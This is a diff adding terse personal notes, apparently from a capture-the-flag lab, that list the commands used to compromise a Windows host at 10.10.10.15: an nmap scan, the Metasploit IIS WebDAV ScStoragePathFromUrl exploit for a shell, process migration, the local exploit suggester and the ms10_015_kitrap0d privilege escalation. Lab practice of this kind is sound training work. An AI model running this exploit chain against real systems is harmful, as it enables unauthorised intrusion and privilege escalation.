@@ -1,0 +1,17 @@
+nmap -T4 -A --top-ports 500 -oN nmap.txt 10.10.10.15
+msfconsole
+search ScStoragePathFromUrl
+use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+options
+set rhosts 10.10.10.15
+run
+# shell!
+ps
+migrate 1848
+background
+search suggester
+use post/multi/recon/local_exploit_suggester
+use exploit/windows/local/ms10_015_kitrap0d
+set lhost tun0
+run
+# got flags
